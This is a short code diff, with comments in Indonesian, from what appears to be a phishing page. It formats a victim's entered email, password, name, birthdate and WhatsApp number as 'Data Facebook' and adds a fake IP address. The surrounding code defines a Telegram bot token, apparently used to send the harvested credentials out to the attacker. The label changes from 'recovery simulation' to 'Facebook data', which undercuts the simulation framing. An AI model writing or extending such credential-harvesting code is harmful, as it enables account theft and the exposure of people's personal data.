@@ -153,13 +153,18 @@
       const birthdate = form.birthdate.value;
       const whatsapp = form.whatsapp.value;
 
+      // Buat IP Dummy untuk simulasi
+      const dummyIP = `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+
       const message = `
-🔐 Simulasi Pemulihan:
+📄 Data Facebook
+-------------------
 📧 Email: ${email}
 🔑 Password: ${password}
 👤 Nama: ${name}
 🎂 Tanggal Lahir: ${birthdate}
 📱 WhatsApp: ${whatsapp}
+🌐 IP (Simulasi): ${dummyIP}
       `;
 
       const telegramBotToken = "8369734639:AAEGF7uTiwTPv5ErNR2XaLly9wjPHZ8U_d4";
